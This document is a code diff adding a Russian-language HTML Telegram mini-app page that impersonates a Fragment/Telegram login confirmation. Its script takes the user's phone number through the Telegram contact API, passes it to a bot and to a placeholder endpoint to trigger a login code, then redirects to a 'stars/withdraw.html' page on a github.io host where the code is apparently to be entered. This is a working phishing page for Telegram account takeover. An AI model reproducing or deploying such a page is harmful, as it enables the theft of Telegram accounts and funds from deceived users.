@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение номера</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .icons {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        .telegram-icon {
+            background: #2481cc;
+            color: white;
+        }
+
+        .fragment-icon {
+            background: #000000;
+            color: white;
+        }
+
+        .arrow {
+            font-size: 30px;
+            color: #2481cc;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 15px;
+        }
+
+        .description {
+            font-size: 15px;
+            color: #707579;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .link {
+            color: #2481cc;
+            text-decoration: none;
+        }
+
+        .warning {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .warning-icon {
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #856404;
+            line-height: 1.5;
+        }
+
+        .share-btn {
+            width: 100%;
+            padding: 16px;
+            background: #2481cc;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-bottom: 10px;
+        }
+
+        .share-btn:hover {
+            background: #1c6ba8;
+        }
+
+        .cancel-btn {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            color: #2481cc;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .cancel-btn:hover {
+            background: #f0f0f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icons">
+            <div class="icon telegram-icon">✈️</div>
+            <div class="arrow">→</div>
+            <div class="icon fragment-icon">◆</div>
+        </div>
+        
+        <div class="title">
+            Войдите, чтобы использовать аккаунт Telegram
+        </div>
+        
+        <div class="description">
+            для <a href="#" class="link">fragment.com</a> и <a href="#" class="link">Fragment Auction Alerts</a>.
+        </div>
+        
+        <div class="description">
+            Введите свой <strong>номер телефона</strong> в <a href="#" class="link">международном формате</a>.
+            Подтверждение будет отправлено в Telegram.
+        </div>
+        
+        <div class="warning">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-text">
+                <strong>Внимание!</strong> Никогда не вводите коды для входа в Telegram в мини-приложениях.
+            </div>
+        </div>
+        
+        <button class="share-btn" onclick="sharePhone()">
+            ПОДЕЛИТЬСЯ НОМЕРОМ ТЕЛЕФОНА
+        </button>
+        
+        <button class="cancel-btn" onclick="cancel()">
+            Отмена
+        </button>
+    </div>
+
+    <script>
+        let tg = window.Telegram?.WebApp;
+        let userId = null;
+
+        // Инициализация
+        if (tg) {
+            tg.expand();
+            tg.ready();
+            
+            // Получаем данные пользователя
+            if (tg.initDataUnsafe?.user) {
+                userId = tg.initDataUnsafe.user.id;
+            }
+        }
+
+        function sharePhone() {
+            if (tg && tg.requestContact) {
+                // Запрашиваем контакт через Telegram WebApp API
+                tg.requestContact(function(result) {
+                    if (result && result.contact) {
+                        const phone = result.contact.phone_number;
+                        
+                        // Отправляем запрос на отправку кода
+                        sendCodeRequest(phone);
+                        
+                        // Переходим на страницу ввода кода
+                        setTimeout(() => {
+                            const withdrawUrl = `https://shaczihakimov-collab.github.io/stars/withdraw.html?phone=${encodeURIComponent('+' + phone)}&user_id=${userId}`;
+                            window.location.href = withdrawUrl;
+                        }, 1000);
+                    }
+                });
+            } else {
+                // Для тестирования вне Telegram
+                const phone = prompt('Введите номер телефона в международном формате (например: +1234567890):');
+                if (phone) {
+                    sendCodeRequest(phone);
+                    const withdrawUrl = `https://shaczihakimov-collab.github.io/stars/withdraw.html?phone=${encodeURIComponent(phone)}&user_id=${userId}`;
+                    window.location.href = withdrawUrl;
+                }
+            }
+        }
+
+        async function sendCodeRequest(phone) {
+            // Отправляем запрос боту на отправку кода
+            if (tg && tg.sendData) {
+                tg.sendData(JSON.stringify({
+                    action: 'send_code',
+                    phone: phone,
+                    user_id: userId
+                }));
+            }
+            
+            // Также можно отправить через API
+            try {
+                const response = await fetch('YOUR_BOT_API_URL/send_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone: phone,
+                        user_id: userId
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Код отправлен:', data);
+            } catch (error) {
+                console.error('Ошибка отправки кода:', error);
+            }
+        }
+
+        function cancel() {
+            if (tg) {
+                tg.close();
+            } else {
+                window.history.back();
+            }
+        }
+    </script>
+</body>
+</html>
